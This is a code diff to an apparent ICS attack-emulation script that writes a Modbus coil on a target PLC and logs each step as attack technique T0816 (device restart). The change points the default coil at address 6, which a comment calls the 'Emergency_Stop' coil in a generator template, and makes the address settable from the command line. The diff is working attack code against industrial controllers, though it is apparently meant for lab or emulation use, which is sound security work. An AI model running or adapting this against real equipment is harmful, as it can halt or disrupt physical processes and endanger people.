@@ -35,7 +35,7 @@ except ImportError:
 
 DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
 
-RESTART_COIL_ADDRESS = 99
+RESTART_COIL_ADDRESS = 6  # Emergency_Stop coil in generator template
 RESTART_COIL_VALUE = True
 
 
@@ -52,7 +52,7 @@ def log_event(log_path: Path, event: dict):
     log_path.write_text(json.dumps(events, indent=2))
 
 
-def run_restart(target: str, port: int, unit: int, log_path: Path) -> bool:
+def run_restart(target: str, port: int, unit: int, coil_address: int, log_path: Path) -> bool:
     """Write the restart coil on the target PLC.
 
     Returns True if the write was accepted (not necessarily executed).
@@ -66,15 +66,15 @@ def run_restart(target: str, port: int, unit: int, log_path: Path) -> bool:
 
     try:
         # Write restart coil
-        print(f"[device_restart] Writing restart coil at address {RESTART_COIL_ADDRESS}")
-        result = client.write_coil(RESTART_COIL_ADDRESS, RESTART_COIL_VALUE, slave=unit)
+        print(f"[device_restart] Writing restart coil at address {coil_address}")
+        result = client.write_coil(coil_address, RESTART_COIL_VALUE, slave=unit)
 
         if result.isError():
             print(f"[device_restart] Coil write returned error: {result}")
             log_event(log_path, {
                 "stage": "attack", "technique": "T0816",
                 "action": "device_restart_error",
-                "target": target, "address": RESTART_COIL_ADDRESS,
+                "target": target, "address": coil_address,
                 "error": str(result),
             })
             return False
@@ -83,7 +83,7 @@ def run_restart(target: str, port: int, unit: int, log_path: Path) -> bool:
         log_event(log_path, {
             "stage": "attack", "technique": "T0816",
             "action": "device_restart",
-            "target": target, "address": RESTART_COIL_ADDRESS,
+            "target": target, "address": coil_address,
             "value": RESTART_COIL_VALUE,
         })
         return True
@@ -111,6 +111,8 @@ def main():
                         help="Modbus TCP port (default: 502)")
     parser.add_argument("-u", "--unit", type=int, default=1,
                         help="Modbus unit/slave ID (default: 1)")
+    parser.add_argument("--coil-address", type=int, default=RESTART_COIL_ADDRESS,
+                        help=f"Coil address for restart command (default: {RESTART_COIL_ADDRESS})")
     parser.add_argument("--log", default=str(DEFAULT_LOG),
                         help="Path to the shared event log store")
     args = parser.parse_args()
@@ -124,7 +126,7 @@ def main():
         "target": args.target,
     })
 
-    success = run_restart(args.target, args.port, args.unit, log_path)
+    success = run_restart(args.target, args.port, args.unit, args.coil_address, log_path)
 
     log_event(log_path, {
         "stage": "attack", "technique": "T0816",
